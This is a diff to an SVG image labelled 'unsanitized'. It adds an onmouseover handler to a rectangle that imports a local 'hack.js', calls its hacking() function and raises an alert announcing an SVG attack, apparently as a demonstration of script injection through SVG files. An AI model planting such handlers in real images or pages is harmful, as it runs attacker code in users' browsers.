@@ -35,7 +35,7 @@
         }
     </style>
 
-    <rect x="10" y="10" width="180" height="180" rx="12" />
+    <rect onmouseover="import('./hack.js').then(mod => mod.hacking()); alert('You are attacked by SVG check the console');" x="10" y="10" width="180" height="180" rx="12" />
     <circle cx="100" cy="85" r="40" />
     <text x="100" y="150" text-anchor="middle">hello svg</text>
     <text x="100" y="170" text-anchor="middle" style="font-size:10px;fill:#94A3B8">unsanitized</text>
@@ -46,11 +46,13 @@
         const circle = document.querySelector('circle');
 
         if (circle) {
-        circle.animate(
-            [{ r: 40 }, { r: 55 }, { r: 40 }],
-            { duration: 1200, iterations: Infinity, easing: 'ease-in-out' }
-        );
+            circle.animate(
+                [{ r: 40 }, { r: 55 }, { r: 40 }],
+                { duration: 1200, iterations: Infinity, easing: 'ease-in-out' }
+            );
         }
+
+        
     </script>
 
 </svg>
